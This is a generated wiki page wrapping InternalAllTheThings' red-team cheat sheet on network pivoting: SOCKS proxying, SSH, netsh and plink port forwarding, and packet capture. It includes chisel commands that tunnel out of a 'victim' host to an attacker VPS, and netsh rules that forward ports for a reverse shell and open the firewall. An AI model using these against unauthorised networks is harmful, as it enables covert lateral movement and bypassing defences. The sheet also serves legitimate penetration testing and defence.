---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Network Pivoting Techniques

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-redteam-pivoting-network-pivoting-techniques` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/pivoting/network-pivoting-techniques.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Network Pivoting Techniques](../../topics/redteam/network-pivoting-techniques.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-redteam-pivoting-network-pivoting-techniques |
| name | Network Pivoting Techniques |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/redteam/pivoting/network-pivoting-techniques.md |

## Preserved Source Material

````yaml
_body: "# Network Pivoting Techniques\n\n## SOCKS Proxy\n\n### SOCKS Compatibility Table\n\n| SOCKS Version | TCP   | UDP\
  \   | IPv4  | IPv6  | Hostname |\n| ------------- | :---: | :---: | :---: | :---: | :---:    |\n| SOCKS v4      | ✅    |\
  \ ❌    | ✅    | ❌    | ❌       |\n| SOCKS v4a     | ✅    | ❌    | ✅    | ❌    | ✅       |\n| SOCKS v5      | ✅    | ✅  \
  \  | ✅    | ✅    | ✅       |\n\n### SOCKS Proxy Usage\n\n#### Proxychains\n\n* [rofl0r/proxychains-ng](https://github.com/rofl0r/proxychains-ng)\
  \ - a preloader which hooks calls to sockets in dynamically linked programs and redirects it through one or more socks/http\
  \ proxies. continuation of the unmaintained proxychains project.\n* [haad/proxychains](https://github.com/haad/proxychains)\
  \ - a tool that forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4,\
  \ SOCKS5 or HTTP(S) proxy. Supported auth-types: \"user/pass\" for SOCKS4/5, \"basic\" for HTTP.\n\nEdit the **configuration\
  \ file** `/etc/proxychains.conf` to add the SOCKS proxies.\n\n```bash\n[ProxyList]\n# socks4 localhost 8080\nsocks5 localhost\
  \ 8081\n```\n\nUncomment `proxy_dns` to also proxify DNS requests.\n\n```ps1\nproxychains nmap -sT 10.10.10.10\nproxychains\
  \ curl http://10.10.10.10\n```\n\n#### Proxifier\n\nProxifier allows network applications that do not support working through\
  \ proxy servers to operate through a SOCKS or HTTPS proxy and chains.\n\n* [proxifier](https://www.proxifier.com/) - The\
  \ Most Advanced Proxy Client\n\nOpen Proxifier, go to **Profile** -> **Proxy Servers** and **Add a new proxy entry**, which\
  \ will point at the IP address and Port of your SOCKS proxy.\n\nGo to **Profile** -> **Proxification Rules**. This is where\
  \ you can add rules that tell Proxifier when and where to proxy specific applications. Multiple applications can be added\
  \ to the same rule.\n\n#### Graftcp\n\n* [hmgle/graftcp](https://github.com/hmgle/graftcp) - A flexible tool for redirecting\
  \ a given program's TCP traffic to SOCKS5 or HTTP proxy.\n\n:warning: Same as proxychains, with another mechanism to \"\
  proxify\" which allow Go applications.\n\n```ps1\n# Create a SOCKS5, using Chisel or another tool and forward it through\
  \ SSH\n(attacker) $ ssh -fNT -i /tmp/id_rsa -L 1080:127.0.0.1:1080 root@IP_VPS\n(vps) $ ./chisel server --tls-key ./key.pem\
  \ --tls-cert ./cert.pem -p 8443 -reverse \n(victim 1) $ ./chisel client --tls-skip-verify https://IP_VPS:8443 R:socks \n\
  \n# Run graftcp and specify the SOCKS5\n(attacker) $ graftcp-local -listen :2233 -logfile /tmp/toto -loglevel 6 -socks5\
  \ 127.0.0.1:1080\n(attacker) $ graftcp ./nuclei -u http://10.10.10.10\n```\n\nSimple configuration file for graftcp: [example-graftcp-local.conf](https://github.com/hmgle/graftcp/blob/master/local/example-graftcp-local.conf)\n\
  \n```py\n## Listen address (default \":2233\")\nlisten = :2233\nloglevel = 1\n\n## SOCKS5 address (default \"127.0.0.1:1080\"\
  )\nsocks5 = 127.0.0.1:1080\n# socks5_username = SOCKS5USERNAME\n# socks5_password = SOCKS5PASSWORD\n\n## Set the mode for\
  \ select a proxy (default \"auto\")\nselect_proxy_mode = auto\n```\n\n## Port Forwarding\n\n### SSH (native)\n\n| Pivoting\
  \ Technique     | Command |\n| ---------------------- | ------- |\n| Local Port Forwarding  | `ssh -L [bindaddr]:[port]:[dsthost]:[dstport]\
  \ [user]@[host]` |\n| Remote Port Forwarding | `ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]` |\n| Socks\
  \ Proxy            | `ssh -N -f -D listenport [user]@[host]` |\n\nInside an already established SSH session, press `~C`\
  \ to opens an interactive mode to add local (-L), remote (-R), or dynamic (-D) port forwards. `-D` currently cannot be added\
  \ after connection. Only `-L` or `-R` work reliably. Dynamic forwarding inside an existing session is not supported by OpenSSH.\n\
  \n```ps1\n~C\n-L 1080:127.0.0.1:1080\n```\n\n### Netsh (native)\n\n```powershell\nnetsh interface portproxy add v4tov4 listenaddress=localaddress\
  \ listenport=localport connectaddress=destaddress connectport=destport\nnetsh interface portproxy add v4tov4 listenport=3340\
  \ listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110\n```\n\n```powershell\n# Forward the port 4545 for\
  \ the reverse shell, and the 80 for the http server for example\nnetsh interface portproxy add v4tov4 listenport=4545 connectaddress=192.168.50.44\
  \ connectport=4545\nnetsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.50.44 connectport=80\n```\n\
  \n```powershell\n# Correctly open the port on the machine\nnetsh advfirewall firewall add rule name=\"PortForwarding 80\"\
  \ dir=in action=allow protocol=TCP localport=80\nnetsh advfirewall firewall add rule name=\"PortForwarding 80\" dir=out\
  \ action=allow protocol=TCP localport=80\nnetsh advfirewall firewall add rule name=\"PortForwarding 4545\" dir=in action=allow\
  \ protocol=TCP localport=4545\nnetsh advfirewall firewall add rule name=\"PortForwarding 4545\" dir=out action=allow protocol=TCP\
  \ localport=4545\n```\n\n1. listenaddress – is a local IP address waiting for a connection.\n2. listenport – local listening\
  \ TCP port (the connection is waited on it).\n3. connectaddress – is a local or remote IP address (or DNS name) to which\
  \ the incoming connection will be redirected.\n4. connectport – is a TCP port to which the connection from listenport is\
  \ forwarded to.\n\n### Custom Tools\n\n* [jpillora/chisel](https://github.com/jpillora/chisel)\n* [ginuerzh/gost](https://github.com/ginuerzh/gost)\n\
  \n    ```ps1\n    gost -L=tcp://:2222/192.168.1.1:22 [-F=..]\n    ```\n\n* [PuTTY/plink](https://putty.org/index.html)\n\
  \n    ```powershell\n    plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS\
  \ IP]\n    plink -l root -pw toor -R 445:127.0.0.1:445 \n    ```\n\n## Network Capture\n\n### TCPDump\n\n* [the-tcpdump-group/tcpdump](https://github.com/the-tcpdump-group/tcpdump)\n\
  \n```ps1\n# capture and save the output inside 0001.pcap\ntcpdump -w 0001.pcap -i eth0\n\n# capture and display packet in\
  \ ASCII\ntcpdump -A -i eth0\n\n# capture every TCP packet on interface eth0\ntcpdump -i eth0 tcp\n\n# capture everything\
  \ on port 22\ntcpdump -i eth0 port 22\n```\n\n### Netsh\n\n* Start a capture use the netsh command.\n\n    ```ps1\n    netsh\
  \ trace start capture=yes report=disabled tracefile=c:\\trace.etl maxsize=16384\n    ```\n\n* Stop the trace\n\n    ```ps1\n\
  \    netsh trace stop\n    ```\n\n* Event tracing\n\n    ```ps1\n    netsh trace start capture=yes report=disabled persistent=yes\
  \ tracefile=c:\\trace.etl maxsize=16384\n    etl2pcapng.exe c:\\trace.etl c:\\trace.pcapng\n    ```\n\n* Use filters\n\n\
  \    ```ps1\n    netsh trace start capture=yes report=disabled Ethernet.Type=IPv4 IPv4.Address=10.200.200.3 tracefile=c:\\\
  trace.etl maxsize=16384\n    ```\n\n## References\n\n* [A Red Teamer's guide to pivoting- Mar 23, 2017 - Artem Kondratenko](https://artkond.com/2017/03/23/pivoting-guide/)\n\
  * [Etat de l’art du pivoting réseau en 2019 - Oct 28,2019 - Alexandre ZANNI](https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/)\n\
  * [GO Simple Tunnel - Documentation](https://gost.run/en/)\n* [Ligolo-ng - Documentation](https://docs.ligolo.ng/)\n* [Overview\
  \ of network pivoting and tunneling [2022 updated] - Alexandre ZANNI](https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/)\n\
  * [Port Forwarding in Windows - Windows OS Hub](http://woshub.com/port-forwarding-in-windows/)\n* [Using the SSH \"Konami\
  \ Code\" (SSH Control Sequences) - Jeff McJunkin - November 10, 2015](https://web.archive.org/web/20151205120607/https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences)\n\
  * [Windows: Capture a network trace with builtin tools (netsh) - Michael Albert - February 22, 2021](https://michlstechblog.info/blog/windows-capture-a-network-trace-with-builtin-tools-netsh/)"
_relative_path: redteam/pivoting/network-pivoting-techniques.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/pivoting/network-pivoting-techniques.md
````
